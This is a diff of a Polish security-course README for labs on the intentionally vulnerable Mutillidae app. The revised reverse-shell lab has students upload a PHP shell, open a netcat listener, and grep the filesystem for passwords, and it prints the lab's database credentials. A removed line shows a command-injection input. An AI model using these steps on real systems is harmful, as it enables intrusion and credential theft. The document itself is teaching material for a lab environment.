@@ -14,7 +14,8 @@ Link do GitHub'a:
 1. Lab0: Adding user, login, password policies. ASVS.
 1. Lab1: Session Hijacking
 1. Lab2: Cross Site Scripting (XSS)
-1. Lab3: Insecure Direct Object Reference (IDOR)
+1. Lab3: Reverse Shell
+1. Lab4: Dodatkowe
 
 ### Instalacja maszyny
 Wersja: 2.8.59
@@ -130,25 +131,30 @@ Podpowiedź: Zobacz jak działa metoda `innerHTML`
 1. Uzupełnij tabelę o nową podatność. Opisz ją.
 
 
-### Lab 3 - Insecure Direct Object Reference (IDOR)
-1. Webshell
-1. `& ls /` on DNSlookup site
-
-
-### Lab 4 - Reverse shell
+### Lab 3 - Reverse shell
 Sprawdzanie tego co widać to nie wszystko. Jednym z ciekawszych elementów, które można sprawdzać to połączenia TCP/UPD na niefiltrowanych portach.
 #### Sposób 1 
 1. Udaj się na stronę `http://localhost/index.php?page=upload-file.php`
-1. Przygotuj skrypt w PHP i zapisz w lokalnym folderze. Podmień adres IP na swój i zapamiętaj port.
+1. Przygotuj skrypt w PHP (plik znajduje się w tym repozytorium pod nazwą `rev.php`) i zapisz w lokalnym folderze. Podmień adres IP na swój i zapamiętaj/zmień port.
 1. W pierwszym terminalu ustaw nasłuchiwanie na wybranym porcie np. `nc -lvnp 1337`. Adres IP ustaw na swój. (Żeby sprawdzić swoje ip wpisz w terminalu `ipconfig -a`)
 1. Zapisz skrypt i wrzuć go na stronę do upload'u.
-1. Pojawi się informacja w jakiej lokalizacji zostało to umieszczone.
+1. Pojawi się informacja w jakiej lokalizacji został umieszczony.
 ![Upload reverse shell](assets/z5.png)
 1. Nawiguj do `http://localhost/index.php?page=/tmp/<nazwa_twojego_pliku>.php`
 1. W momencie wejścia na stronę wywołuje się skrypt a w terminalu powinniśmy mieć aktywne połączenie.
 ![Reverse Shell 1](assets/z6.png)
-
-
+1. Posiadając dostęp do wewnętrznej struktury katalogów spróbujmy znaleźć hasło do bazy danych.
+1. Sprawdźmy wszystkie pliki o rozszerzeniu "*.php". `find / -name "*.php" | xargs grep -i "password" | grep "="`
+1. W całym ciągu tekstu interesuje nas ten urywek
+```
+/var/www/mutillidae/classes/YouTubeVideoHandler.php:	public $HowtoResetRootPasswordinMySQLMariaDB = 143;
+/var/www/mutillidae/classes/MySQLHandler.php:	static public $mMySQLDatabasePassword = DB_PASSWORD;
+/var/www/mutillidae/classes/MySQLHandler.php:	static public $MUTILLIDAE_DBV1_PASSWORD = "";
+/var/www/mutillidae/classes/MySQLHandler.php:	static public $MUTILLIDAE_DBV2_PASSWORD = "mutillidae";
+/var/www/mutillidae/classes/MySQLHandler.php:	static public $SAMURAI_WTF_PASSWORD = "samurai";
+/var/www/mutillidae/classes/MySQLHandler.php:	        $this->mMySQLConnection = new mysqli($pHOSTNAME,$pUSERNAME, $pPASSWORD, NULL, $pPORT);
+```
+1. Hasło do bazy to `samurai`
 
 #### Sposób 2
 1. Upewnij się, że aplikacja ciągle działa w tle.
@@ -161,6 +167,8 @@ Sprawdzanie tego co widać to nie wszystko. Jednym z ciekawszych elementów, kt�
 1. W nasłuchiwanym terminalu powinien pojawić się shell.
 ![Reverse shell](assets/z3.png)  
 
+1. Tak samo jak w sposobie 1 spróbuj odszukać hasło do bazy danych.
+1. Porównaj jakie masz uprawnienia w obu przypadkach? Co może być powodem?
 
 ### Lab 4 - Dodatkowe
 Ta część laboratorium jest przeznaczona na własny rekonesans. Wcześniejsze przykłady były podane w wąskim zakresie dlatego teraz pora na rozwinięcie skrzydeł. Przetestuj aplikację we własnym zakresie - z tym co wiesz lub chcesz poznać. Propozycja: skorzystaj z podanych list i testuj wszystko po kolei. 
